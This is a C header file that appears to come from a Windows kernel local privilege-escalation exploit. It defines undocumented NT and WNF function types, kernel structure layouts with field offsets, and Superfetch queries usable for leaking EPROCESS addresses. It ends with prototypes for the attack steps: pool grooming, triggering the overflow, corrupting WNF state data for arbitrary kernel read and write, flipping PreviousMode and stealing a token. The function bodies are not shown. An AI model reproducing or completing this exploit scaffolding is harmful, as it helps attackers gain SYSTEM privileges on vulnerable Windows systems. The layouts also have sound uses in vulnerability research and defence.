#pragma once

typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID    Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;


typedef NTSTATUS(NTAPI* __ZwQueryEaFile)(
	HANDLE           FileHandle,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID            Buffer,
	ULONG            Length,
	BOOLEAN          ReturnSingleEntry,
	PVOID            EaList,
	ULONG            EaListLength,
	PULONG           EaIndex,
	BOOLEAN          RestartScan
	);

typedef NTSTATUS(NTAPI* __ZwSetEaFile)(
	HANDLE           FileHandle,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID            Buffer,
	ULONG            Length
	);

typedef struct _FILE_FULL_EA_INFORMATION {
	ULONG  NextEntryOffset;
	UCHAR  Flags;
	UCHAR  EaNameLength;
	USHORT EaValueLength;
	CHAR   EaName[1];
} FILE_FULL_EA_INFORMATION, * PFILE_FULL_EA_INFORMATION;



typedef struct _FILE_GET_EA_INFORMATION {
	ULONG NextEntryOffset;
	UCHAR EaNameLength;
	CHAR  EaName[1];
} FILE_GET_EA_INFORMATION, * PFILE_GET_EA_INFORMATION;


typedef struct _WNF_STATE_NAME {
	ULONG Data[2];
} WNF_STATE_NAME, * PWNF_STATE_NAME;

typedef enum _WNF_STATE_NAME_LIFETIME
{
	WnfWellKnownStateName,
	WnfPermanentStateName,
	WnfPersistentStateName,
	WnfTemporaryStateName
} WNF_STATE_NAME_LIFETIME;


typedef enum _WNF_DATA_SCOPE
{
	WnfDataScopeSystem,
	WnfDataScopeSession,
	WnfDataScopeUser,
	WnfDataScopeProcess,
	WnfDataScopeMachine
} WNF_DATA_SCOPE;


typedef struct _WNF_TYPE_ID
{
	GUID TypeId;
} WNF_TYPE_ID, * PWNF_TYPE_ID;


typedef const WNF_TYPE_ID* PCWNF_TYPE_ID;

typedef NTSTATUS(NTAPI* __NtCreateWnfStateName)(
	_Out_ PWNF_STATE_NAME StateName,
	_In_ WNF_STATE_NAME_LIFETIME NameLifetime,
	_In_ WNF_DATA_SCOPE DataScope,
	_In_ BOOLEAN PersistData,
	_In_opt_ PCWNF_TYPE_ID TypeId,
	_In_ ULONG MaximumStateSize,
	_In_ PSECURITY_DESCRIPTOR SecurityDescriptor
	);



typedef ULONG WNF_CHANGE_STAMP, * PWNF_CHANGE_STAMP;

typedef NTSTATUS(NTAPI* __NtUpdateWnfStateData)(
	_In_ PWNF_STATE_NAME StateName,
	_In_reads_bytes_opt_(Length) const VOID* Buffer,
	_In_opt_ ULONG Length,
	_In_opt_ PCWNF_TYPE_ID TypeId,
	_In_opt_ const PVOID ExplicitScope,
	_In_ WNF_CHANGE_STAMP MatchingChangeStamp,
	_In_ ULONG CheckStamp);

typedef NTSTATUS(NTAPI* __NtReadVirtualMemory)(
	_In_ HANDLE ProcessHandle,
	_In_opt_ PVOID BaseAddress,
	_Out_writes_bytes_(BufferSize) PVOID Buffer,
	_In_ SIZE_T BufferSize,
	_Out_opt_ PSIZE_T NumberOfBytesRead
	);

typedef NTSTATUS(NTAPI* __NtWriteVirtualMemory)(
	_In_ HANDLE ProcessHandle,
	_In_opt_ PVOID BaseAddress,
	_In_reads_bytes_(BufferSize) CONST VOID* Buffer,
	_In_ SIZE_T BufferSize,
	_Out_opt_ PSIZE_T NumberOfBytesWritten
	);

typedef NTSTATUS(NTAPI* __NtQueryWnfStateData)(
	_In_ PWNF_STATE_NAME StateName,
	_In_opt_ PWNF_TYPE_ID TypeId,
	_In_opt_ const VOID* ExplicitScope,
	_Out_ PWNF_CHANGE_STAMP ChangeStamp,
	_Out_writes_bytes_to_opt_(*BufferSize_InOut, *BufferSize_InOut) PVOID Buffer,
	_Inout_ PULONG BufferSize);


typedef NTSTATUS(NTAPI* __NtQuerySystemInformation)(
	IN DWORD SystemInformationClass,
	OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength OPTIONAL
);


typedef struct _WNF_STATE_NAME_REGISTRATION
{
	PVOID64 MaxStateSize;
	PVOID64  TypeId;
	PVOID64 SecurityDescriptor;
}WNF_STATE_NAME_REGISTRATION, * PWNF_STATE_NAME_REGISTRATION;



typedef NTSTATUS
(NTAPI* __NtDeleteWnfStateData)
(
	_In_ PWNF_STATE_NAME StateName,
	_In_opt_ const VOID* ExplicitScope
	);


typedef NTSTATUS(NTAPI* __NtDeleteWnfStateName)(_In_ PWNF_STATE_NAME StateName);


struct _WNF_NODE_HEADER
{
	USHORT NodeTypeCode;                                                    //0x0
	USHORT NodeByteSize;                                                    //0x2
};

struct _EX_RUNDOWN_REF
{
	union
	{
		ULONGLONG Count;                                                    //0x0
		VOID* Ptr;                                                          //0x0
	};
};

struct _RTL_BALANCED_NODE
{
	union
	{
		struct _RTL_BALANCED_NODE* Children[2];                             //0x0
		struct
		{
			struct _RTL_BALANCED_NODE* Left;                                //0x0
			struct _RTL_BALANCED_NODE* Right;                               //0x8
		};
	};
	union
	{
		struct
		{
			UCHAR Red : 1;                                                    //0x10
			UCHAR Balance : 2;                                                //0x10
		};
		ULONGLONG ParentValue;                                              //0x10
	};
};

struct _WNF_STATE_NAME_STRUCT
{
	ULONGLONG Version : 4;                                                    //0x0
	ULONGLONG NameLifetime : 2;                                               //0x0
	ULONGLONG DataScope : 4;                                                  //0x0
	ULONGLONG PermanentData : 1;                                              //0x0
	ULONGLONG Sequence : 53;                                                  //0x0
};

struct _EX_PUSH_LOCK
{
	union
	{
		struct
		{
			ULONGLONG Locked : 1;                                             //0x0
			ULONGLONG Waiting : 1;                                            //0x0
			ULONGLONG Waking : 1;                                             //0x0
			ULONGLONG MultipleShared : 1;                                     //0x0
			ULONGLONG Shared : 60;                                            //0x0
		};
		ULONGLONG Value;                                                    //0x0
		VOID* Ptr;                                                          //0x0
	};
};

struct _WNF_LOCK
{
	struct _EX_PUSH_LOCK PushLock;                                          //0x0
};

struct _RTL_AVL_TREE
{
	struct _RTL_BALANCED_NODE* Root;                                        //0x0
};

struct _WNF_SCOPE_INSTANCE
{
	struct _WNF_NODE_HEADER Header;                                         //0x0
	struct _EX_RUNDOWN_REF RunRef;                                          //0x8
	enum _WNF_DATA_SCOPE DataScope;                                         //0x10
	ULONG InstanceIdSize;                                                   //0x14
	VOID* InstanceIdData;                                                   //0x18
	struct _LIST_ENTRY ResolverListEntry;                                   //0x20
	struct _WNF_LOCK NameSetLock;                                           //0x30
	struct _RTL_AVL_TREE NameSet;                                           //0x38
	VOID* PermanentDataStore;                                               //0x40
	VOID* VolatilePermanentDataStore;                                       //0x48
};


struct _WNF_STATE_DATA
{
	struct _WNF_NODE_HEADER Header;                                         //0x0
	ULONG AllocatedSize;                                                    //0x4
	ULONG DataSize;                                                         //0x8
	ULONG ChangeStamp;                                                      //0xc
};



typedef struct _WNF_NAME_INSTANCE
{
	_WNF_NODE_HEADER Header;                                         //0x0
	_EX_RUNDOWN_REF RunRef;                                          //0x8
	_RTL_BALANCED_NODE TreeLinks;                                    //0x10
	_WNF_STATE_NAME_STRUCT StateName;                                //0x28
	_WNF_SCOPE_INSTANCE* ScopeInstance;                              //0x30
	_WNF_STATE_NAME_REGISTRATION StateNameInfo;                      //0x38
	_WNF_LOCK StateDataLock;                                         //0x50
	_WNF_STATE_DATA* StateData;                                      //0x58
	ULONG CurrentChangeStamp;                                               //0x60
	VOID* PermanentDataStore;                                               //0x68
	struct _WNF_LOCK StateSubscriptionListLock;                             //0x70
	struct _LIST_ENTRY StateSubscriptionListHead;                           //0x78
	struct _LIST_ENTRY TemporaryNameListEntry;                              //0x88
	PVOID  CreatorProcess;                                       //0x98
	LONG DataSubscribersCount;                                              //0xa0
	LONG CurrentDeliveryCount;                                              //0xa4
}WNF_NAME_INSTANCE, * PWNF_NAME_INSTANCE;


typedef struct _STRING64 {
	USHORT   Length;
	USHORT   MaximumLength;
	ULONGLONG  Buffer;
} STRING64;
typedef STRING64* PSTRING64;

//0x388 bytes (sizeof)
typedef struct _PEB64
{
	UCHAR InheritedAddressSpace;                                            //0x0
	UCHAR ReadImageFileExecOptions;                                         //0x1
	UCHAR BeingDebugged;                                                    //0x2
	union
	{
		UCHAR BitField;                                                     //0x3
		struct
		{
			UCHAR ImageUsesLargePages : 1;                                    //0x3
			UCHAR IsProtectedProcess : 1;                                     //0x3
			UCHAR IsImageDynamicallyRelocated : 1;                            //0x3
			UCHAR SkipPatchingUser32Forwarders : 1;                           //0x3
			UCHAR IsPackagedProcess : 1;                                      //0x3
			UCHAR IsAppContainer : 1;                                         //0x3
			UCHAR IsProtectedProcessLight : 1;                                //0x3
			UCHAR SpareBits : 1;                                              //0x3
		};
	};
	UCHAR Padding0[4];                                                      //0x4
	ULONGLONG Mutant;                                                       //0x8
	ULONGLONG ImageBaseAddress;                                             //0x10
	ULONGLONG Ldr;                                                          //0x18
	ULONGLONG ProcessParameters;                                            //0x20
	ULONGLONG SubSystemData;                                                //0x28
	ULONGLONG ProcessHeap;                                                  //0x30
	ULONGLONG FastPebLock;                                                  //0x38
	ULONGLONG AtlThunkSListPtr;                                             //0x40
	ULONGLONG IFEOKey;                                                      //0x48
	union
	{
		ULONG CrossProcessFlags;                                            //0x50
		struct
		{
			ULONG ProcessInJob : 1;                                           //0x50
			ULONG ProcessInitializing : 1;                                    //0x50
			ULONG ProcessUsingVEH : 1;                                        //0x50
			ULONG ProcessUsingVCH : 1;                                        //0x50
			ULONG ProcessUsingFTH : 1;                                        //0x50
			ULONG ReservedBits0 : 27;                                         //0x50
		};
	};
	UCHAR Padding1[4];                                                      //0x54
	union
	{
		ULONGLONG KernelCallbackTable;                                      //0x58
		ULONGLONG UserSharedInfoPtr;                                        //0x58
	};
	ULONG SystemReserved[1];                                                //0x60
	ULONG AtlThunkSListPtr32;                                               //0x64
	ULONGLONG ApiSetMap;                                                    //0x68
	ULONG TlsExpansionCounter;                                              //0x70
	UCHAR Padding2[4];                                                      //0x74
	ULONGLONG TlsBitmap;                                                    //0x78
	ULONG TlsBitmapBits[2];                                                 //0x80
	ULONGLONG ReadOnlySharedMemoryBase;                                     //0x88
	ULONGLONG SparePvoid0;                                                  //0x90
	ULONGLONG ReadOnlyStaticServerData;                                     //0x98
	ULONGLONG AnsiCodePageData;                                             //0xa0
	ULONGLONG OemCodePageData;                                              //0xa8
	ULONGLONG UnicodeCaseTableData;                                         //0xb0
	ULONG NumberOfProcessors;                                               //0xb8
	ULONG NtGlobalFlag;                                                     //0xbc
	union _LARGE_INTEGER CriticalSectionTimeout;                            //0xc0
	ULONGLONG HeapSegmentReserve;                                           //0xc8
	ULONGLONG HeapSegmentCommit;                                            //0xd0
	ULONGLONG HeapDeCommitTotalFreeThreshold;                               //0xd8
	ULONGLONG HeapDeCommitFreeBlockThreshold;                               //0xe0
	ULONG NumberOfHeaps;                                                    //0xe8
	ULONG MaximumNumberOfHeaps;                                             //0xec
	ULONGLONG ProcessHeaps;                                                 //0xf0
	ULONGLONG GdiSharedHandleTable;                                         //0xf8
	ULONGLONG ProcessStarterHelper;                                         //0x100
	ULONG GdiDCAttributeList;                                               //0x108
	UCHAR Padding3[4];                                                      //0x10c
	ULONGLONG LoaderLock;                                                   //0x110
	ULONG OSMajorVersion;                                                   //0x118
	ULONG OSMinorVersion;                                                   //0x11c
	USHORT OSBuildNumber;                                                   //0x120
	USHORT OSCSDVersion;                                                    //0x122
	ULONG OSPlatformId;                                                     //0x124
	ULONG ImageSubsystem;                                                   //0x128
	ULONG ImageSubsystemMajorVersion;                                       //0x12c
	ULONG ImageSubsystemMinorVersion;                                       //0x130
	UCHAR Padding4[4];                                                      //0x134
	ULONGLONG ActiveProcessAffinityMask;                                    //0x138
	ULONG GdiHandleBuffer[60];                                              //0x140
	ULONGLONG PostProcessInitRoutine;                                       //0x230
	ULONGLONG TlsExpansionBitmap;                                           //0x238
	ULONG TlsExpansionBitmapBits[32];                                       //0x240
	ULONG SessionId;                                                        //0x2c0
	UCHAR Padding5[4];                                                      //0x2c4
	union _ULARGE_INTEGER AppCompatFlags;                                   //0x2c8
	union _ULARGE_INTEGER AppCompatFlagsUser;                               //0x2d0
	ULONGLONG pShimData;                                                    //0x2d8
	ULONGLONG AppCompatInfo;                                                //0x2e0
	struct _STRING64 CSDVersion;                                            //0x2e8
	ULONGLONG ActivationContextData;                                        //0x2f8
	ULONGLONG ProcessAssemblyStorageMap;                                    //0x300
	ULONGLONG SystemDefaultActivationContextData;                           //0x308
	ULONGLONG SystemAssemblyStorageMap;                                     //0x310
	ULONGLONG MinimumStackCommit;                                           //0x318
	ULONGLONG FlsCallback;                                                  //0x320
	struct LIST_ENTRY64 FlsListHead;                                        //0x328
	ULONGLONG FlsBitmap;                                                    //0x338
	ULONG FlsBitmapBits[4];                                                 //0x340
	ULONG FlsHighIndex;                                                     //0x350
	ULONGLONG WerRegistrationData;                                          //0x358
	ULONGLONG WerShipAssertPtr;                                             //0x360
	ULONGLONG pUnused;                                                      //0x368
	ULONGLONG pImageHeaderHash;                                             //0x370
	union
	{
		ULONG TracingFlags;                                                 //0x378
		struct
		{
			ULONG HeapTracingEnabled : 1;                                     //0x378
			ULONG CritSecTracingEnabled : 1;                                  //0x378
			ULONG LibLoaderTracingEnabled : 1;                                //0x378
			ULONG SpareTracingBits : 29;                                      //0x378
		};
	};
	UCHAR Padding6[4];                                                      //0x37c
	ULONGLONG CsrServerReadOnlySharedMemoryBase;                            //0x380
} PEB64, * PPEB64;

typedef enum _SUPERFETCH_INFORMATION_CLASS
{
	SuperfetchRetrieveTrace = 0x1,
	SuperfetchSystemParameters = 0x2,
	SuperfetchLogEvent = 0x3,
	SuperfetchGenerateTrace = 0x4,
	SuperfetchPrefetch = 0x5,
	SuperfetchPfnQuery = 0x6,
	SuperfetchPfnSetPriority = 0x7,
	SuperfetchPrivSourceQuery = 0x8,
	SuperfetchSequenceNumberQuery = 0x9,
	SuperfetchScenarioPhase = 0xA,
	SuperfetchWorkerPriority = 0xB,
	SuperfetchScenarioQuery = 0xC,
	SuperfetchScenarioPrefetch = 0xD,
	SuperfetchRobustnessControl = 0xE,
	SuperfetchTimeControl = 0xF,
	SuperfetchMemoryListQuery = 0x10,
	SuperfetchMemoryRangesQuery = 0x11,
	SuperfetchTracingControl = 0x12,
	SuperfetchTrimWhileAgingControl = 0x13,
	SuperfetchInformationMax = 0x14,
} SUPERFETCH_INFORMATION_CLASS;

typedef struct _SUPERFETCH_INFORMATION
{
	ULONG Version;
	ULONG Magic;
	SUPERFETCH_INFORMATION_CLASS InfoClass;
	PVOID Data;
	ULONG Length;
} SUPERFETCH_INFORMATION, * PSUPERFETCH_INFORMATION;

typedef enum _PFS_PRIVATE_PAGE_SOURCE_TYPE {
	PfsPrivateSourceKernel = 0x0,
	PfsPrivateSourceSession = 0x1,
	PfsPrivateSourceProcess = 0x2,
	PrfsPrivateSourceMax = 0x3,
} PFS_PRIVATE_PAGE_SOURCE_TYPE;

#pragma pack(push)
#pragma pack(4)

typedef struct _PFS_PRIVATE_PAGE_SOURCE
{
	PFS_PRIVATE_PAGE_SOURCE_TYPE Type;
	union {
		DWORD SessionId;
		DWORD ProcessId;
	};
	DWORD SpareDwords[2];
	ULONG ImagePathHash;
	ULONG UniqueProcessHash;
} PFS_PRIVATE_PAGE_SOURCE, * PPFS_PRIVATE_PAGE_SOURCE;

typedef struct _PF_PRIVSOURCE_INFO_V3 {
	PFS_PRIVATE_PAGE_SOURCE DbInfo;
	union {
		ULONG_PTR EProcess;
		ULONG_PTR GlobalVA;
	};
	ULONG WsPrivatePages;
	ULONG TotalPrivatePages;
	ULONG SessionID;
	CHAR ImageName[16];
	BYTE SpareBytes[12];
} PF_PRIVSOURCE_INFO_V3, * PPF_PRIVSOURCE_INFO_V3;

typedef struct _PF_PRIVSOURCE_INFO_V3PLUS {
	BYTE data2[8];
	DWORD ProcessId;
	BYTE data3[16];
	ULONG_PTR EProcess;
	BYTE data[60];
} PF_PRIVSOURCE_INFO_V3PLUS, * PPF_PRIVSOURCE_INFO_V3PLUS;

typedef struct _PF_PRIVSOURCE_QUERY_REQUEST {
	ULONG Version;

	union {
		__declspec(align(4)) struct {
			ULONG InfoCount;
			PF_PRIVSOURCE_INFO_V3 InfoArrayV3[1];
		} __sv3;
		__declspec(align(4)) struct {
			ULONG Type;
			ULONG InfoCount;
			PF_PRIVSOURCE_INFO_V3PLUS InfoArrayV3Plus[1];
		} __sv3plus;
	} __u0;
} PF_PRIVSOURCE_QUERY_REQUEST, * PPF_PRIVSOURCE_QUERY_REQUEST;

#pragma pack(pop)




bool Groom();
bool TriggerOverflow();
bool Exploit(UINT_PTR pEProcess);
bool IsStateNameDeleted(PWNF_STATE_NAME StateName);

bool PointStateDataToAddress(PWNF_STATE_NAME CorruptedStateName, UINT_PTR Address, UINT_PTR* Out_ExternalStateName, INT Offset = 0);
bool ReadRelativeBuffer(PWNF_STATE_NAME CorruptedStateName, PVOID TempBuffer, ULONG TempBufferSize);
bool ReadQWord(PWNF_STATE_NAME CorruptedStateName, UINT_PTR Address, UINT_PTR &Result, UINT_PTR * OutExternalStateName = 0);

bool FlipPreviousMode(PWNF_STATE_NAME pNameInstance, UINT_PTR pEProcess, DWORD Value);
PWNF_NAME_INSTANCE FindNameInstance(UCHAR* Buffer, DWORD BufferLength);

bool RevertPreviousMode(UINT_PTR pEPRocess);
bool RevertOtherChanges(UINT_PTR pEProcess, UINT_PTR BackupToken);
bool TokenStealing(UINT_PTR pEProcess, UINT_PTR * BackupToken);
bool NtReadWrapper(UINT_PTR Address, PVOID Buffer, ULONG BufferSize);
bool NtWriteWrapper(UINT_PTR Address, PVOID Buffer, ULONG BufferSize);